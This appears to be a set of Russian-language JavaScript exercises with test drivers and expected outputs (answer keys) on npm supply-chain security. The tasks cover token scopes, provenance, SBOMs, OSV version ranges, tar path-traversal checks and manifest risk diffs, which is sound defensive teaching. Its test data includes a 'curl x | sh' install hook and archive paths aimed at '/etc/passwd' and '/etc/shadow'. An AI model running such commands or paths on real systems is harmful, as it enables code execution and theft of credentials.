 {'id': 'j25-token-allows',
  'mode': 'js',
  'title': 'Права токена доступа',
  'statement': "Напишите tokenAllows(token, action, pkg, now): token = { actions: ['read', "
               "'publish'], packages: ['@my/*', 'lodash', '*'], expiresAt? }. Токен действует, "
               'пока now < expiresAt (нет expiresAt — бессрочный). Разрешено, если action входит в '
               'actions и имя пакета подходит под один из шаблонов: точное имя; «@область/*» — '
               'любой пакет этой области; «*» — любой пакет. Просроченный токен или нарушение '
               'любого условия — false.',
  'starter': 'function tokenAllows(token, action, pkg, now) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const tok = { actions: ["read", "publish"], packages: ["@my/*", "lodash"], expiresAt: '
            '1000 };\n'
            'const t = (a, p, n) => console.log(a, p, n, tokenAllows(tok, a, p, n));\n'
            't("publish", "@my/ui", 10); t("read", "lodash", 999); t("read", "lodash", 1000); '
            't("publish", "@other/ui", 10); t("delete", "lodash", 10); t("read", "@my", 10); '
            't("read", "@my/", 10);\n'
            'console.log(tokenAllows({ actions: ["read"], packages: ["*"] }, "read", "anything", '
            '1e12), tokenAllows({ actions: ["read"], packages: [] }, "read", "x", 0));\n',
  'hint': 'Функция matchPattern(pattern, name) с тремя вариантами.',
  'expected': ['publish @my/ui 10 true',
               'read lodash 999 true',
               'read lodash 1000 false',
               'publish @other/ui 10 false',
               'delete lodash 10 false',
               'read @my 10 false',
               'read @my/ 10 false',
               'true false']},
 {'id': 'j25-provenance',
  'mode': 'js',
  'title': 'Проверка provenance',
  'statement': 'Напишите verifyProvenance(att, expected): att = { builder: { id }, source: { repo, '
               'commit, ref }, workflow: { path } }, expected = { builders: [допустимые id], repo, '
               'workflowPrefix }. Верните массив проблем в порядке: «untrusted builder» '
               '(att.builder.id не из expected.builders); «repo mismatch» (att.source.repo !== '
               'expected.repo); «invalid commit» (commit — не 40 строчных hex-цифр); «ref is not a '
               'tag» (ref не начинается с «refs/tags/»); «unexpected workflow» (workflow.path не '
               'начинается с expected.workflowPrefix). Отсутствующие поля считаются нарушением '
               'соответствующей проверки.',
  'starter': 'function verifyProvenance(att, expected) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const exp = { builders: ["https://github.com/actions/runner"], repo: '
            '"github.com/co/lib", workflowPrefix: ".github/workflows/" };\n'
            'const good = { builder: { id: "https://github.com/actions/runner" }, source: { repo: '
            '"github.com/co/lib", commit: "a".repeat(40), ref: "refs/tags/v1.0.0" }, workflow: { '
            'path: ".github/workflows/release.yml" } };\n'
            'const t = (a) => console.log(JSON.stringify(verifyProvenance(a, exp)));\n'
            't(good);\n'
            't({ ...good, builder: { id: "evil" } });\n'
            't({ ...good, source: { ...good.source, repo: "github.com/evil/lib", commit: "XYZ", '
            'ref: "refs/heads/main" } });\n'
            't({ ...good, workflow: { path: "scripts/publish.sh" } });\n'
            't({});\n'
            't({ ...good, source: { ...good.source, commit: "a".repeat(41) } });\n',
  'hint': 'Опциональная цепочка ?. и последовательные проверки.',
  'expected': ['[]',
               '["untrusted builder"]',
               '["repo mismatch","invalid commit","ref is not a tag"]',
               '["unexpected workflow"]',
               '["untrusted builder","repo mismatch","invalid commit","ref is not a '
               'tag","unexpected workflow"]',
               '["invalid commit"]']},
 {'id': 'j25-sbom',
  'mode': 'js',
  'title': 'Список компонентов (SBOM)',
  'statement': 'Напишите buildSbom(tree): tree — { путь установки: версия } (имя — часть после '
               "последнего «node_modules/»). Верните { bomFormat: 'CycloneDX', specVersion: '1.5', "
               "components } — components: уникальные пары имя@версия, каждый { type: 'library', "
               'name, version, purl }, отсортированы по name, затем по version (строчное '
               'сравнение). purl: «pkg:npm/имя@версия»; для имени с областью «@scope/pkg» символ '
               '«@» кодируется как «%40»: «pkg:npm/%40scope/pkg@версия».',
  'starter': 'function buildSbom(tree) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const tree = { "node_modules/zod": "3.23.8", "node_modules/@types/node": "20.1.0", '
            '"node_modules/a/node_modules/zod": "3.23.8", "node_modules/b/node_modules/zod": '
            '"3.22.0", "node_modules/ms": "2.1.3" };\n'
            'console.log(JSON.stringify(buildSbom(tree), null, 1));\n'
            'console.log(JSON.stringify(buildSbom({})));\n',
  'hint': 'Map по ключу name@version, затем sort.',
  'expected': ['{',
               ' "bomFormat": "CycloneDX",',
               ' "specVersion": "1.5",',
               ' "components": [',
               '  {',
               '   "type": "library",',
               '   "name": "@types/node",',
               '   "version": "20.1.0",',
               '   "purl": "pkg:npm/%40types/node@20.1.0"',
               '  },',
               '  {',
               '   "type": "library",',
               '   "name": "ms",',
               '   "version": "2.1.3",',
               '   "purl": "pkg:npm/ms@2.1.3"',
               '  },',
               '  {',
               '   "type": "library",',
               '   "name": "zod",',
               '   "version": "3.22.0",',
               '   "purl": "pkg:npm/zod@3.22.0"',
               '  },',
               '  {',
               '   "type": "library",',
               '   "name": "zod",',
               '   "version": "3.23.8",',
               '   "purl": "pkg:npm/zod@3.23.8"',
               '  }',
               ' ]',
               '}',
               '{"bomFormat":"CycloneDX","specVersion":"1.5","components":[]}']},
 {'id': 'j25-purl',
  'mode': 'js',
  'title': 'Package URL',
  'statement': 'Напишите formatPurl({ name, version }) и parsePurl(str). formatPurl — '
               '«pkg:npm/имя@версия», у имени с областью «@» кодируется как «%40» (версия '
               'необязательна: без неё нет «@версия»). parsePurl — обратное преобразование: '
               'возвращает { name, version } (version — null, если не указана) либо null, если '
               'строка не начинается с «pkg:npm/» или имя пусто.',
  'starter': 'function formatPurl({ name, version }) {\n}\nfunction parsePurl(str) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'console.log(formatPurl({ name: "zod", version: "3.23.8" }));\n'
            'console.log(formatPurl({ name: "@types/node", version: "20.1.0" }));\n'
            'console.log(formatPurl({ name: "lodash" }));\n'
            'for (const s of ["pkg:npm/zod@3.23.8", "pkg:npm/%40types/node@20.1.0", '
            '"pkg:npm/lodash", "pkg:npm/%40s/p", "pkg:pypi/requests@2", "pkg:npm/", "zod@1", '
            '"pkg:npm/@s/p@1.0.0-beta.1"])\n'
            '  console.log(s, JSON.stringify(parsePurl(s)));\n',
  'hint': 'При разборе сначала замените «%40» на «@», затем отделите версию по последнему «@» '
          'после имени.',
  'expected': ['pkg:npm/zod@3.23.8',
               'pkg:npm/%40types/node@20.1.0',
               'pkg:npm/lodash',
               'pkg:npm/zod@3.23.8 {"name":"zod","version":"3.23.8"}',
               'pkg:npm/%40types/node@20.1.0 {"name":"@types/node","version":"20.1.0"}',
               'pkg:npm/lodash {"name":"lodash","version":null}',
               'pkg:npm/%40s/p {"name":"@s/p","version":null}',
               'pkg:pypi/requests@2 null',
               'pkg:npm/ null',
               'zod@1 null',
               'pkg:npm/@s/p@1.0.0-beta.1 {"name":"@s/p","version":"1.0.0-beta.1"}']},
 {'id': 'j25-osv-range',
  'mode': 'js',
  'title': 'Диапазоны уязвимых версий (OSV)',
  'statement': 'Напишите isVulnerable(version, events): events — массив в стиле OSV, например '
               "[{introduced:'0'},{fixed:'1.2.3'},{introduced:'2.0.0'},{fixed:'2.0.5'}]. События "
               'идут парами: introduced открывает диапазон, следующий fixed (версия не включается) '
               'или last_affected (включается) закрывает. Версия уязвима, если попадает в любой '
               "диапазон [introduced, fixed) / [introduced, last_affected]. introduced '0' "
               'означает «с самого начала». Если после introduced нет закрывающего события — '
               'диапазон открыт до бесконечности. Версии сравниваются по semver; предрелизы — как '
               'обычные. Помощники parseV, cmpV есть.',
  'starter': '// Готово: разбор версии и сравнение (не изменяйте)\n'
             'function parseV(s) {\n'
             '  const m = '
             '/^v?(\\d+)\\.(\\d+)\\.(\\d+)(?:-([0-9A-Za-z.-]+))?$/.exec(String(s).trim());\n'
             '  if (!m) return null;\n'
             '  return { major: +m[1], minor: +m[2], patch: +m[3], pre: m[4] ? m[4].split(".") : '
             '[] };\n'
             '}\n'
             'function cmpV(a, b) {\n'
             '  const x = parseV(a), y = parseV(b);\n'
             '  for (const k of ["major", "minor", "patch"]) if (x[k] !== y[k]) return x[k] < y[k] '
             '? -1 : 1;\n'
             '  if (!x.pre.length && !y.pre.length) return 0;\n'
             '  if (!x.pre.length) return 1;\n'
             '  if (!y.pre.length) return -1;\n'
             '  const n = Math.max(x.pre.length, y.pre.length);\n'
             '  for (let i = 0; i < n; i++) {\n'
             '    if (i >= x.pre.length) return -1;\n'
             '    if (i >= y.pre.length) return 1;\n'
             '    const p = x.pre[i], q = y.pre[i];\n'
             '    if (p === q) continue;\n'
             '    const pn = /^\\d+$/.test(p), qn = /^\\d+$/.test(q);\n'
             '    if (pn && qn) return +p < +q ? -1 : 1;\n'
             '    if (pn) return -1;\n'
             '    if (qn) return 1;\n'
             '    return p < q ? -1 : 1;\n'
             '  }\n'
             '  return 0;\n'
             '}\n'
             '// Готово: поддерживает точную версию, ^, ~, >=, >, <=, <, * и «И» через пробел (без '
             'предрелизов)\n'
             'function satisfies(version, range) {\n'
             '  const v = parseV(version);\n'
             '  if (!v || v.pre.length) return false;\n'
             '  return range.trim().split(/\\s+/).every((c) => {\n'
             '    if (c === "*" || c === "") return true;\n'
             '    const m = /^(\\^|~|>=|<=|>|<|=)?(\\d+\\.\\d+\\.\\d+)$/.exec(c);\n'
             '    const op = m[1] || "=", t = parseV(m[2]);\n'
             '    const r = cmpV(version, m[2]);\n'
             '    if (op === "^") {\n'
             '      const up = t.major > 0 ? `${t.major + 1}.0.0` : t.minor > 0 ? `0.${t.minor + '
             '1}.0` : `0.0.${t.patch + 1}`;\n'
             '      return r >= 0 && cmpV(version, up) < 0;\n'
             '    }\n'
             '    if (op === "~") return r >= 0 && cmpV(version, `${t.major}.${t.minor + 1}.0`) < '
             '0;\n'
             '    return op === ">=" ? r >= 0 : op === "<=" ? r <= 0 : op === ">" ? r > 0 : op === '
             '"<" ? r < 0 : r === 0;\n'
             '  });\n'
             '}\n'
             'function isVulnerable(version, events) {\n'
             '}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const ev = [{ introduced: "0" }, { fixed: "1.2.3" }, { introduced: "2.0.0" }, { '
            'fixed: "2.0.5" }];\n'
            'const t = (v, e = ev) => console.log(v, isVulnerable(v, e));\n'
            't("0.0.1"); t("1.2.2"); t("1.2.3"); t("1.9.0"); t("2.0.0"); t("2.0.4"); t("2.0.5"); '
            't("3.0.0");\n'
            'const open = [{ introduced: "1.5.0" }];\n'
            't("1.4.9", open); t("1.5.0", open); t("99.0.0", open);\n'
            'const last = [{ introduced: "1.0.0" }, { last_affected: "1.4.0" }];\n'
            't("1.4.0", last); t("1.4.1", last); t("0.9.0", last);\n'
            't("1.0.0", []);\n',
  'hint': 'Разберите события последовательно: запомните introduced, при fixed/last_affected '
          'проверьте попадание.',
  'expected': ['0.0.1 true',
               '1.2.2 true',
               '1.2.3 false',
               '1.9.0 false',
               '2.0.0 true',
               '2.0.4 true',
               '2.0.5 false',
               '3.0.0 false',
               '1.4.9 false',
               '1.5.0 true',
               '99.0.0 true',
               '1.4.0 true',
               '1.4.1 false',
               '0.9.0 false',
               '1.0.0 false']},
 {'id': 'j25-reverse-deps',
  'mode': 'js',
  'title': 'Кто зависит от пакета',
  'statement': 'Напишите transitiveDependents(graph, target): graph — { пакет: [его зависимости] '
               '}. Верните отсортированный массив всех пакетов, которые прямо или косвенно зависят '
               'от target (сам target не включается, даже при цикле). Нет таких — пустой массив. '
               'target может отсутствовать в graph.',
  'starter': 'function transitiveDependents(graph, target) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const g = { app: ["ui", "api"], ui: ["react", "ms"], api: ["express", "ms"], express: '
            '["ms"], react: [], lint: ["ms"], solo: [], cycle1: ["cycle2", "ms"], cycle2: '
            '["cycle1"] };\n'
            'const t = (x) => console.log(x, JSON.stringify(transitiveDependents(g, x)));\n'
            't("ms"); t("react"); t("app"); t("solo"); t("cycle1"); t("ghost");\n',
  'hint': 'Постройте обратный граф и обойдите его от target (поиск в ширину с множеством '
          'посещённых).',
  'expected': ['ms ["api","app","cycle1","cycle2","express","lint","ui"]',
               'react ["app","ui"]',
               'app []',
               'solo []',
               'cycle1 ["cycle2"]',
               'ghost []']},
 {'id': 'j25-dep-stats',
  'mode': 'js',
  'title': 'Глубина и ширина зависимостей',
  'statement': 'Напишите depStats(graph, root): graph — { пакет: [зависимости] }. Верните { '
               'direct, transitive, maxDepth }: direct — число уникальных прямых зависимостей '
               'root; transitive — число уникальных пакетов, достижимых из root (без самого root); '
               'maxDepth — длина самого длинного пути от root (в рёбрах) без повторения узлов в '
               'пути (циклы не удлиняют путь). Если root нет в graph — все числа 0.',
  'starter': 'function depStats(graph, root) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const g = { app: ["a", "b", "a"], a: ["c"], b: ["c", "d"], c: ["e"], d: [], e: [], '
            'loop1: ["loop2"], loop2: ["loop1", "x"], x: [] };\n'
            'const t = (r) => console.log(r, JSON.stringify(depStats(g, r)));\n'
            't("app"); t("a"); t("e"); t("loop1"); t("ghost");\n',
  'hint': 'Обход в глубину; множество «на текущем пути» защищает от циклов.',
  'expected': ['app {"direct":2,"transitive":5,"maxDepth":3}',
               'a {"direct":1,"transitive":2,"maxDepth":2}',
               'e {"direct":0,"transitive":0,"maxDepth":0}',
               'loop1 {"direct":1,"transitive":2,"maxDepth":2}',
               'ghost {"direct":0,"transitive":0,"maxDepth":0}']},
 {'id': 'j25-bus-factor',
  'mode': 'js',
  'title': 'Фактор автобуса',
  'statement': 'Напишите busFactor(maintainers): maintainers — { пакет: [сопровождающие] }. '
               'Верните { risky, ratio }: risky — отсортированные имена пакетов, у которых ровно '
               'один уникальный сопровождающий (или ни одного); ratio — доля risky от всех '
               'пакетов, округлённая до 2 знаков (для пустого входа — 0).',
  'starter': 'function busFactor(maintainers) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'console.log(JSON.stringify(busFactor({ a: ["x"], b: ["x", "y"], c: [], d: ["z", "z"], '
            'e: ["p", "q", "r"] })));\n'
            'console.log(JSON.stringify(busFactor({ a: ["x", "y"] })));\n'
            'console.log(JSON.stringify(busFactor({})));\n'
            'console.log(JSON.stringify(busFactor({ a: ["x"], b: ["y"], c: ["z"] })));\n',
  'hint': 'Set из сопровождающих; Math.round(x * 100) / 100.',
  'expected': ['{"risky":["a","c","d"],"ratio":0.6}',
               '{"risky":[],"ratio":0}',
               '{"risky":[],"ratio":0}',
               '{"risky":["a","b","c"],"ratio":1}']},
 {'id': 'j25-ttl-cache',
  'mode': 'js',
  'title': 'Кэш метаданных с TTL',
  'statement': 'Напишите createCache(ttlMs, now): now — функция текущего времени (мс). Возвращает '
               '{ get, set, getOrFetch }. set(key, value) запоминает значение с временем now(); '
               'get(key) возвращает значение, если now() − время < ttlMs, иначе undefined '
               '(просроченное удаляется). getOrFetch(key, fetchFn) — async: вернуть свежее '
               'значение из кэша, иначе вызвать fetchFn() и сохранить результат; одновременные '
               'вызовы с одним key должны вызвать fetchFn один раз; при ошибке fetchFn ничего не '
               'кэшируется и ошибка пробрасывается (следующий вызов пробует снова).',
  'starter': 'function createCache(ttlMs, now) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'let t = 0;\n'
            'const cache = createCache(100, () => t);\n'
            'cache.set("a", 1);\n'
            'console.log(cache.get("a")); t = 99; console.log(cache.get("a")); t = 100; '
            'console.log(cache.get("a"));\n'
            'let calls = 0;\n'
            'const fetchFn = async () => { calls++; await null; return "v" + calls; };\n'
            't = 0;\n'
            'const [x, y] = await Promise.all([cache.getOrFetch("k", fetchFn), '
            'cache.getOrFetch("k", fetchFn)]);\n'
            'console.log(x, y, calls);\n'
            't = 50; console.log(await cache.getOrFetch("k", fetchFn), calls);\n'
            't = 100; console.log(await cache.getOrFetch("k", fetchFn), calls);\n'
            'let fails = 0;\n'
            'const flaky = async () => { fails++; if (fails === 1) throw new Error("net"); return '
            '"ok"; };\n'
            'try { await cache.getOrFetch("f", flaky); } catch (e) { console.log("!" + e.message); '
            '}\n'
            'console.log(await cache.getOrFetch("f", flaky), fails);\n',
  'hint': 'Map значений и Map «промисов в полёте»; удаляйте промис из «полёта» в finally.',
  'expected': ['1', '1', 'undefined', 'v1 v1 1', 'v1 1', 'v2 2', '!net', 'ok 2']},
 {'id': 'j25-retry-after',
  'mode': 'js',
  'title': 'Заголовок Retry-After',
  'statement': 'Напишите parseRetryAfter(header, nowMs): значение заголовка — либо целое число '
               'секунд («120»), либо HTTP-дата («Wed, 21 Oct 2015 07:28:00 GMT»). Верните задержку '
               'в миллисекундах: для секунд — число × 1000; для даты — max(0, Date.parse(header) − '
               'nowMs). Пустое, отрицательное, дробное число и нераспознанная дата — null. Пробелы '
               'по краям игнорируются.',
  'starter': 'function parseRetryAfter(header, nowMs) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const now = Date.parse("2015-10-21T07:27:00Z");\n'
            'for (const h of ["120", " 5 ", "0", "Wed, 21 Oct 2015 07:28:00 GMT", "Wed, 21 Oct '
            '2015 07:26:00 GMT", "-5", "1.5", "", "soon", "abc 123", undefined])\n'
            '  console.log(JSON.stringify(h), parseRetryAfter(h, now));\n',
  'hint': 'Сначала /^\\d+$/ для секунд, затем Date.parse.',
  'expected': ['"120" 120000',
               '" 5 " 5000',
               '"0" 0',
               '"Wed, 21 Oct 2015 07:28:00 GMT" 60000',
               '"Wed, 21 Oct 2015 07:26:00 GMT" 0',
               '"-5" null',
               '"1.5" null',
               '"" null',
               '"soon" null',
               '"abc 123" 0',
               'undefined null']},
 {'id': 'j25-mirrors',
  'mode': 'js',
  'title': 'Запасные зеркала реестра',
  'statement': 'Напишите async fetchFromMirrors(urls, fetchFn): последовательно вызывает '
               'fetchFn(url) для каждого адреса из urls. Первый успешный результат возвращает как '
               '{ url, value }. Если все попытки провалились (или urls пуст) — бросить '
               "AggregateError(errors, 'All mirrors failed'), где errors — массив ошибок по "
               'порядку.',
  'starter': 'async function fetchFromMirrors(urls, fetchFn) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const mk = (ok) => async (url) => { if (!ok.includes(url)) throw new Error("down " + '
            'url); return "data:" + url; };\n'
            'console.log(JSON.stringify(await fetchFromMirrors(["a", "b"], mk(["a", "b"]))));\n'
            'console.log(JSON.stringify(await fetchFromMirrors(["a", "b", "c"], mk(["c"]))));\n'
            'const calls = [];\n'
            'await fetchFromMirrors(["a", "b", "c"], async (u) => { calls.push(u); if (u !== "b") '
            'throw new Error("x"); return 1; });\n'
            'console.log(calls.join(","));\n'
            'for (const urls of [["a", "b"], []]) {\n'
            '  try { await fetchFromMirrors(urls, mk([])); } catch (e) { console.log(e instanceof '
            'AggregateError, e.message, e.errors.map((x) => x.message).join("|")); }\n'
            '}\n',
  'hint': 'Цикл с try/catch и накоплением ошибок; после цикла — throw new AggregateError(errors, '
          "'...').",
  'expected': ['{"url":"a","value":"data:a"}',
               '{"url":"c","value":"data:c"}',
               'a,b',
               'true All mirrors failed down a|down b',
               'true All mirrors failed']},
 {'id': 'j25-tar-entries',
  'mode': 'js',
  'title': 'Безопасные пути в архиве',
  'statement': 'Напишите checkTarEntries(entries): entries — записи { path, type: '
               "'file'|'dir'|'symlink', linkname? } (пути POSIX). Для каждой записи по порядку "
               'добавьте проблемы: «ПУТЬ: absolute path» (путь начинается с «/»); «ПУТЬ: path '
               'traversal» (после нормализации путь начинается с «../» или равен «..», т.е. '
               'выходит за корень распаковки; сегменты «.» и «x/..» нормализуются); для symlink — '
               '«ПУТЬ: unsafe symlink», если linkname абсолютный или, будучи разрешён относительно '
               'каталога самой ссылки, выходит за корень. Результат — массив строк в порядке '
               'записей.',
  'starter': 'import path from "node:path/posix";\nfunction checkTarEntries(entries) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const entries = [\n'
            '  { path: "package/index.js", type: "file" },\n'
            '  { path: "/etc/passwd", type: "file" },\n'
            '  { path: "package/../../evil.sh", type: "file" },\n'
            '  { path: "package/./a/../b.js", type: "file" },\n'
            '  { path: "../x", type: "dir" },\n'
            '  { path: "package/link", type: "symlink", linkname: "index.js" },\n'
            '  { path: "package/bad", type: "symlink", linkname: "/etc/shadow" },\n'
            '  { path: "package/up", type: "symlink", linkname: "../../secret" },\n'
            '  { path: "package/sub/ok", type: "symlink", linkname: "../index.js" },\n'
            '  { path: "a/../..", type: "dir" },\n'
            '];\n'
            'console.log(checkTarEntries(entries).join("\\n"));\n'
            'console.log(checkTarEntries([]).length);\n',
  'hint': 'path.normalize; для ссылки: path.normalize(path.join(path.dirname(entry.path), '
          'linkname)).',
  'expected': ['/etc/passwd: absolute path',
               'package/../../evil.sh: path traversal',
               '../x: path traversal',
               'package/bad: unsafe symlink',
               'package/up: unsafe symlink',
               'a/../..: path traversal',
               '0']},
 {'id': 'j25-normalize-name',
  'mode': 'js',
  'title': 'Нормализация имён пакетов',
  'statement': 'Напишите normalizeName(name) и isConfusable(a, b). normalizeName: нижний регистр; '
               'символы «_» и «.» заменить на «-»; подряд идущие «-» схлопнуть в один; «-» по '
               'краям убрать (область «@scope/» не трогайте особым образом — «/» и «@» '
               'сохраняются). isConfusable(a, b): true, если a !== b, а нормализованные имена '
               'равны.',
  'starter': 'function normalizeName(name) {\n}\nfunction isConfusable(a, b) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'for (const n of ["Left_Pad", "left.pad", "left--pad", "-left-pad-", "@Scope/My_Pkg", '
            '"plain", "A__B..C"]) console.log(JSON.stringify(n), '
            'JSON.stringify(normalizeName(n)));\n'
            'console.log(isConfusable("left-pad", "left_pad"), isConfusable("left-pad", '
            '"left-pad"), isConfusable("left-pad", "leftpad"), isConfusable("Foo.Bar", "foo-bar"), '
            'isConfusable("a", "b"));\n',
  'hint': 'Две-три replace с регулярными выражениями.',
  'expected': ['"Left_Pad" "left-pad"',
               '"left.pad" "left-pad"',
               '"left--pad" "left-pad"',
               '"-left-pad-" "left-pad"',
               '"@Scope/My_Pkg" "@scope/my-pkg"',
               '"plain" "plain"',
               '"A__B..C" "a-b-c"',
               'true false false true false']},
 {'id': 'j25-pkg-score',
  'mode': 'js',
  'title': 'Оценка здоровья пакета',
  'statement': 'Напишите packageScore(info): info = { weeklyDownloads, lastPublishDays, '
               'openIssuesRatio, hasTypes, license, dependencies } (dependencies — число). Сумма '
               'баллов: популярность — min(30, round(log10(weeklyDownloads + 1) × 5)); свежесть — '
               '25 при lastPublishDays ≤ 90, 15 при ≤ 365, 5 при ≤ 730, иначе 0; issues — 15 при '
               'openIssuesRatio ≤ 0.1, 8 при ≤ 0.3, иначе 0; типы — 10, если hasTypes; лицензия — '
               '10, если MIT, Apache-2.0, BSD-3-Clause или ISC; зависимости — 10 при 0, 5 при ≤ 5, '
               'иначе 0. Верните целое.',
  'starter': 'function packageScore(info) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const t = (o) => console.log(packageScore({ weeklyDownloads: 0, lastPublishDays: '
            '9999, openIssuesRatio: 1, hasTypes: false, license: "GPL-3.0", dependencies: 99, ...o '
            '}));\n'
            't({});\n'
            't({ weeklyDownloads: 1000000, lastPublishDays: 30, openIssuesRatio: 0.05, hasTypes: '
            'true, license: "MIT", dependencies: 0 });\n'
            't({ weeklyDownloads: 10, lastPublishDays: 90, openIssuesRatio: 0.1, license: "ISC", '
            'dependencies: 5 });\n'
            't({ weeklyDownloads: 9999, lastPublishDays: 91, openIssuesRatio: 0.11, dependencies: '
            '6 });\n'
            't({ weeklyDownloads: 1e12, lastPublishDays: 365, openIssuesRatio: 0.3, hasTypes: true '
            '});\n'
            't({ weeklyDownloads: 300, lastPublishDays: 730, license: "Apache-2.0", dependencies: '
            '1 });\n',
  'hint': 'Складывайте шесть слагаемых, Math.log10 и Math.round для популярности.',
  'expected': ['0', '100', '60', '43', '63', '32']},
 {'id': 'j25-supply-diff',
  'mode': 'js',
  'title': 'Что изменилось в манифесте',
  'statement': 'Напишите diffManifests(oldM, newM): сравнение манифестов { dependencies, scripts, '
               'license }. Верните массив строк-рисков в порядке групп: 1) «new dependency: ИМЯ» '
               'для зависимостей, которых не было (по алфавиту); 2) «removed dependency: ИМЯ» (по '
               'алфавиту); 3) «new install script: ХУК» для preinstall, install, postinstall (в '
               'таком порядке), которых раньше не было; 4) «license changed: СТАРАЯ -> НОВАЯ» '
               '(если лицензии различаются; отсутствующая — «none»). Нет изменений — пустой '
               'массив.',
  'starter': 'function diffManifests(oldM, newM) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const a = { dependencies: { x: "^1", y: "^1", z: "^1" }, scripts: { test: "t", '
            'postinstall: "node a.js" }, license: "MIT" };\n'
            'const b = { dependencies: { y: "^2", z: "^1", w: "^3", v: "^1" }, scripts: { test: '
            '"t", postinstall: "node a.js", preinstall: "curl x | sh", install: "node-gyp rebuild" '
            '}, license: "GPL-3.0" };\n'
            'console.log(JSON.stringify(diffManifests(a, b)));\n'
            'console.log(JSON.stringify(diffManifests(a, a)));\n'
            'console.log(JSON.stringify(diffManifests({}, { license: "MIT" })));\n'
            'console.log(JSON.stringify(diffManifests({ license: "MIT" }, {})));\n',
  'hint': 'Сравните ключи dependencies множествами; хуки — по Object.hasOwn.',
  'expected': ['["new dependency: v","new dependency: w","removed dependency: x","new install '
               'script: preinstall","new install script: install","license changed: MIT -> '
               'GPL-3.0"]',
               '[]',
               '["license changed: none -> MIT"]',
               '["license changed: MIT -> none"]']},
 {'id': 'j25-jsr-score',
  'mode': 'js',
  'title': 'Оценка пакета в стиле JSR',
  'statement': 'Напишите jsrScore(pkg): pkg = { hasReadme, hasDescription, hasExamples, '
               'docCoverage, runtimes, hasProvenance } (runtimes — массив из node, deno, bun, '
               'browser; docCoverage — проценты). Баллы: README — 10; описание — 10; примеры — 10; '
               'документация — 20 при docCoverage ≥ 80, 10 при ≥ 50, иначе 0; среды — по 5 за '
               'каждую уникальную из node, deno, bun, browser; происхождение (hasProvenance) — 15. '
               'Верните { score, missing }, где missing — список ненабранных пунктов (в таком '
               "порядке): 'readme', 'description', 'examples', 'docs', 'runtimes', 'provenance'. "
               'docs считается ненабранным при docCoverage < 80; runtimes — если указаны не все '
               'четыре.',
  'starter': 'function jsrScore(pkg) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const t = (o) => console.log(JSON.stringify(jsrScore(o)));\n'
            't({});\n'
            't({ hasReadme: true, hasDescription: true, hasExamples: true, docCoverage: 90, '
            'runtimes: ["node", "deno", "bun", "browser"], hasProvenance: true });\n'
            't({ hasReadme: true, docCoverage: 60, runtimes: ["node", "node", "deno"] });\n'
            't({ hasDescription: true, hasExamples: true, docCoverage: 79, runtimes: ["browser", '
            '"wasm"], hasProvenance: true });\n'
            't({ docCoverage: 80, runtimes: [] });\n',
  'hint': 'Накапливайте score и push в missing при неполном наборе.',
  'expected': ['{"score":0,"missing":["readme","description","examples","docs","runtimes","provenance"]}',
               '{"score":85,"missing":[]}',
               '{"score":30,"missing":["description","examples","docs","runtimes","provenance"]}',
               '{"score":50,"missing":["readme","docs","runtimes"]}',
               '{"score":20,"missing":["readme","description","examples","runtimes","provenance"]}']},
 {'id': 'j25-trusted-registry',
  'mode': 'js',
  'title': 'Доверенный адрес реестра',
  'statement': 'Напишите isTrustedRegistry(url, allowlist): true только если url разбирается через '
               'new URL, протокол — https:, нет имени пользователя и пароля в адресе, порт не '
               'указан или равен 443, а hostname равен одному из allowlist либо оканчивается на '
               '«.» + запись из allowlist (поддомен). Регистр имени узла не учитывается. Любая '
               'ошибка разбора — false.',
  'starter': 'function isTrustedRegistry(url, allowlist) {\n}\n',
  'driver': '/*__DRIVER__*/\n'
            '\n'
            'const allow = ["registry.npmjs.org", "npm.company.example"];\n'
            'for (const u of ["https://registry.npmjs.org/", "https://REGISTRY.npmjs.org/zod", '
            '"http://registry.npmjs.org/", "https://eu.npm.company.example/x", '
            '"https://evilnpm.company.example/", "https://npm.company.example.evil.com/", '
            '"https://user:pw@registry.npmjs.org/", "https://registry.npmjs.org:443/", '
            '"https://registry.npmjs.org:8443/", "not a url", "", "https://xregistry.npmjs.org"])\n'
            '  console.log(JSON.stringify(u), isTrustedRegistry(u, allow));\n',
  'hint': 'try { new URL(url) } catch { return false }; hostname уже в нижнем регистре.',
  'expected': ['"https://registry.npmjs.org/" true',
               '"https://REGISTRY.npmjs.org/zod" true',
               '"http://registry.npmjs.org/" false',
               '"https://eu.npm.company.example/x" true',
               '"https://evilnpm.company.example/" false',
               '"https://npm.company.example.evil.com/" false',
               '"https://user:pw@registry.npmjs.org/" false',
               '"https://registry.npmjs.org:443/" true',
               '"https://registry.npmjs.org:8443/" false',
               '"not a url" false',
               '"" false',
               '"https://xregistry.npmjs.org" false']}]}
